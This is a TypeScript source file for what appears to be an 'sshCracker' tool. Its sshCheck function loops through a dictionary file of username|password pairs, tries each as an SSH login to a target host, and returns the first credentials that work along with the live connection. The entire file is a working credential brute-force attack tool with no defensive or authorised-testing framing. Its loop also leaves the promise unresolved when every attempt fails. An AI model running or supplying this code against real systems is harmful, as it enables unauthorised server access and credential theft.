import fs from "fs";
import { NodeSSH } from "node-ssh";
const ssh = new NodeSSH();

/** Types */
import { sshCheckResult } from "../types/sshCracker";

export async function sshCheck(
    hostname: string,
    timeout: number
): Promise<sshCheckResult> {
    return new Promise(async (resolve) => {
        if (!fs.existsSync("data/dictionary.txt")) return resolve({
            status: "error",
            message: "data/dictionary.txt does not exist."
        });
        const dictionary: string[] = fs.readFileSync("data/dictionary.txt", "utf-8").split("\n").filter(line => line !== "");
        for (const key of dictionary) {
            const [ username, password ] = key.split("|");
            try {
                const result = await ssh.connect({
                    hostname: hostname,
                    username: username,
                    password: password,
                    timeout: timeout
                });
                if (result) {
                    return resolve({
                        status: "success",
                        hostname: hostname,
                        username: username,
                        password: password,
                        result: result
                    });
                }
            } catch (_) {
                continue;
            }
            resolve({
                status: "error",
                message: "Connection failed."
            });
        }
    });
};
